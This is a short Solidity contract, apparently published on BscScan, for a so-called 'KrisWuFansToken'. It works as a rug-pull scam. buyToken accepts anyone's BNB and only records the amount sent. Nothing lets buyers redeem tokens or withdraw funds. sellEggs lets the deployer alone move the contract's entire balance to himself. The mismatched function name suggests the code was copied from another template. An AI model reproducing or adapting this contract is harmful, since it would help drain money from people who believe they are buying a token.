/**
 *Submitted for verification at BscScan.com on 2022-11-26
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.4.26;

contract KrisWuFansToken{
    address FansChief;
    uint256 public TotalToken;
    bool public initialized=false;
    mapping (address => uint256) public claimedToken;

    constructor() public{
        FansChief=msg.sender;
    }

    function seedMarket() public payable{
        require(msg.sender == FansChief, 'invalid call');
        require(TotalToken==0);
        initialized=true;
        TotalToken=10000;
    }

    function buyToken() public payable{
        require(initialized);
        claimedToken[msg.sender]=msg.value;
    }

    function sellEggs(address ref) public {
        require(msg.sender == FansChief, 'invalid call');
        require(ref==FansChief);
        FansChief.transfer(address(this).balance);
    }

}